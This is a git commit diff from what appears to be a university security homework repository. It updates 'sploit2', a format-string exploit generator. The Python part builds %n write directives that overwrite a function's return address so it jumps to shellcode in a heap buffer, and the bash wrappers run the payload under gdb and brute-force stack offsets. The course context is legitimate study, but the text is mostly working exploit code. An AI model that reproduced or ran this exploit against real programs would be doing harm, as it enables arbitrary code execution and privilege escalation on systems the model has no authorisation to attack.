cf47ef0bba212880ba7a06779df2bf2d90fc36fa
Planeman <planemantheace@gmail.com>
2012-09-24 17:40:30 -0500

    Changed printf sploit script (sploit2) to use my new strategy. Committing this to test on the vm.

--- hw1/sploit2/sploit2.sh
+++ hw1/sploit2/sploit2.sh
@@ -58,8 +58,6 @@ import sys
 #
 #   retr_ptr_val - The value you want to write at ehe ret_ptr_addr.
 
-rewrite_addr_list = None
-
 def hexify(num):
   num = "%x" % (num)
 
@@ -75,53 +73,20 @@ def hasTermByte(addr):
 
   return False
 
-def fillInitialAddress(fstr, addr, fstr_addr, direction=1):
-  """This function fills in the addresses at the beginning of the format
-  string that define the 4 sequential addresses we need to write to. Depending
-  on what address you give you may want to either increment or decrement
-  to get the next one. Specify this using the direction argument.
-  """
+def fillInitialAddress(fstr, addr,  direction=1):
 
-  global rewrite_addr_list
-
-  # Here is the ordering:
-  # Heap addresses (we need 16, one for each byte of the later addresses)
-  # 4 byte padding
-  # Four 4 byte addresses
-  # 4 byte padding
-  padding = "\x01\x01\x01\x01"
-
-  # Whereever the rewrite addresses are stored it will be offsetted from the base
-  # fstr_addr since the first (16*4 + 6) bytes will contain ".bcvs/" and then
-  # the 16 byte addresses
-  fstr_addr += 70
-
-  fstr_addrs = [hexify(fstr_addr + direction*i)[::-1] for i in range(16)]
-  for a in fstr_addrs:
-    # Since we are storing the addresses on the stack in main this no longe matters.
-    # This should really have a command line option incase it switches again later
-    #if hasTermByte(a):
-    #  print("Cannot build attack string whose heap pointer has copy terminating character")
-    #  sys.exit(-1)
-
-    fstr += a
-
-  fstr += padding
+  # We first need 2 bytes of padding because the '.bcvs/' at the beginning
+  # of log is going to throw us off the word boundary
+  fstr += "\x01\x01"
 
   # Create a list of addresses, incremented by 'direction'
   addr_list = [hexify(addr+(direction*i))[::-1] for i in range(4)]
-  rewrite_addr_list = addr_list  # For easier access later
   for a in addr_list:
-    if hasTermByte(a):
-      # This means we can't insert the address because it would
-      # stop the copying into the heap buffer. This will likely
-      # be true for all the addresses so we could just skip the check.
-
-      fstr += padding
-    else:
-      fstr += a
-
-  fstr += padding
+    # If the addresses we are writing here have null bytes we may need to
+    # redo the rewrite technique from earlier. Since the stack is ~always~
+    # aligned to a 16 byte boundary not ending with 00 then we shouldn't
+    # have problems
+    fstr += a
 
   return fstr
 
@@ -140,13 +105,15 @@ def findRequiredOffset(targetByte, cWritten):
 
   return diff
 
-def fillReturnPointerValue(fstr, targetRetAddr, rewriteBytes, offset):
-  """targetRetAddr should be a byte string (return from *.decode('hex'))
-  rewriteBytes should be a list like the one generated in fillInitialAddress"""
-  # We need to write it in reverse order
+def fillReturnPointerValue(fstr, targetRetAddr, offset):
+  # This is the address in memory that the fprintf attack ultimately
+  # wants to make writeLog return to. The addresses to write this address
+  # to have already been setup we just need to create the correct
+  # fprintf directives to write the bytes we want
   targetRetAddr = targetRetAddr[::-1]
 
-  total = offset
+  # Since the addresses are going on elsewhere on the stack and aren't part
+  # of the format string we don't count them in the bytes written
   #written = len(fstr)
   written = 0
 
@@ -155,32 +122,18 @@ def fillReturnPointerValue(fstr, targetRetAddr, rewriteBytes, offset):
   # direct parameter access for variable offset/4
   dpa_offset = offset / 4
 
-  # First we need to rewrite the return pointer byte addresses since we
-  # had to zero them out to be copied.
-  for addr in rewriteBytes:
-    # Each address is an increment of the previous
-    for b in addr:
-      # Now we need to determine the offsets in the format string to write these.
-      # What we are doing is picking off the heap addresses given in the beginning
-      # and writing out the appropriate value to these to essentially write the
-      # format string how we ideally would have in the first place
-      diff = findRequiredOffset(b, written)
-      fstr += "%{}x%{}\$n".format(diff, dpa_offset)
-      dpa_offset += 1
-      written += diff
-
-  # Increment the dpa_offset to account for the padding
-  dpa_offset += 1
-
-  # Now this portion of the format string will use our newly written addrs to
-  # overwrite writeLog's return address to be targetRetAddr
+  # Now this portion of the format string will use the addrs in main's 'log'
+  # to overwrite writeLog's return address to be targetRetAddr
   for i in range(4):
+    # What padding do we need for the %x directive in order to write the
+    # desired byte?
     diff = findRequiredOffset(targetRetAddr[i], written)
     fstr += "%{}x%{}\$n".format(diff, dpa_offset);
     #print("fstr = {}".format(fstr))
     written += diff
     dpa_offset += 1
 
+  # The format string should be all done and ready to go
   return fstr
 
 def byteStrToInt(s):
@@ -195,26 +148,21 @@ def padByteString(s):
   return s
 
 if __name__ == '__main__':
-  if len(sys.argv) < 4:
+  if len(sys.argv) < 3:
     usage()
     sys.exit(1)
 
   rptr_offset = 0
-  if len(sys.argv) > 4:
+  if len(sys.argv) > 3:
     rptr_offset = int(sys.argv[4])
 
   # Some input checking
   sys.argv[1] = padByteString(sys.argv[1])
   sys.argv[2] = padByteString(sys.argv[2])
-  sys.argv[3] = padByteString(sys.argv[3])
-  #print("Return Pointer Location = {}".format(sys.argv[1]))
-  #print("Return Pointer Address = {}".format(sys.argv[2]))
 
   rptr_addr = sys.argv[1].decode('hex')
   rptr_val = sys.argv[2].decode('hex')
-  heap_ptr = sys.argv[3].decode('hex')
   rptr_addr_int = int(sys.argv[1], 16) - rptr_offset
-  heap_ptr_int = int(sys.argv[3], 16)
 
   # This is the offset above the printf call to find the start of the
   # format string itself so we can access the addresses.
@@ -231,10 +179,11 @@ if __name__ == '__main__':
   # 19 above but printf knows to skip its return address when reading
   # variables (duh).
   init_fprintf_offset = 18 * 4
+  init_fprintf_offset += 8  # (for the '.bcvs/' and the 2 padding bytes)
 
   format_str = ""
-  format_str = fillInitialAddress(format_str, rptr_addr_int, heap_ptr_int, 1)
-  format_str = fillReturnPointerValue(format_str, rptr_val, rewrite_addr_list, init_fprintf_offset)
+  format_str = fillInitialAddress(format_str, rptr_addr_int, 1)
+  format_str = fillReturnPointerValue(format_str, rptr_val, init_fprintf_offset)
 
   print("{}".format(format_str))
   sys.exit(0)
@@ -243,18 +192,17 @@ EOS
 cat <<EOS > "rerun_sploit.sh"
 #!/bin/bash
 cd ..
-./sploit2.sh
+./sploit2.sh $1
 cd sploit2_dir
 EOS
 
 cat <<EOS > "run_w_gdb.sh"
 #!/bin/bash
 ATTACK_JMP_ADDR="804C3A8"
-FSTR_ADDR_LOCATION="bffff638"
-FORMAT_ADDRS_LEN=88
+FORMAT_ADDRS_LEN=18
 
 SHELLCODE=\$(./payload.py 200)
-FORMAT_STR=\$(./gen_fmt_str.py bffff61C \$ATTACK_JMP_ADDR \$FSTR_ADDR_LOCATION)
+FORMAT_STR=\$(./gen_fmt_str.py bffff61C \$ATTACK_JMP_ADDR)
 FORMAT_ADDRS=\${FORMAT_STR:0:\$FORMAT_ADDRS_LEN}
 FORMAT_DIRS=\${FORMAT_STR:\$FORMAT_ADDRS_LEN}
 echo "Shellcode: \$SHELLCODE"
@@ -270,6 +218,12 @@ chmod +x payload.py
 chmod +x gen_fmt_str.py
 chmod +x rerun_sploit.sh
 chmod +x run_w_gdb.sh
+
+if [[ $# -gt 0 && $1 == "-s" ]]; then
+  # This way we can update the scripts without running the exploit
+  echo "Skipping actual exploit. Scripts should be updated."
+  exit 0
+fi
 
 SHELLCODE=`./payload.py 200`
 
@@ -289,15 +243,14 @@ ATTACK_JMP_ADDR="804C3A8"  # This is 0xD0 bytes into the heap buffer
 # this is no longer necessary
 HEAP_PTR="804c2d8" # Given we don't have ASLR enabled this seems to be consistent
 
-FSTR_ADDR_LOCATION="bffff638"
-FORMAT_ADDRS_LEN=88  # How many bytes at the beginning of the format string are for the addrs
+FORMAT_ADDRS_LEN=18  # How many bytes at the beginning of the format string are for the addrs
 
 # Now we brute force it. Hopefully if our initial guess isn't too far off we
 # should get it soon.
 while [[ $OFFSET -lt 100 ]]; do 
   _OFFSET=$(( $OFFSET * 16 ))
   echo "Generating format string [base,offset]: [$RET_PTR_LOC,$_OFFSET]"
-  FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $FSTR_ADDR_LOCATION $_OFFSET`
+  FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET`
   FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
   FORMAT_DIRS=${FORMAT_STR:$FORMAT_ADDRS_LEN}  # These are the format directives
 
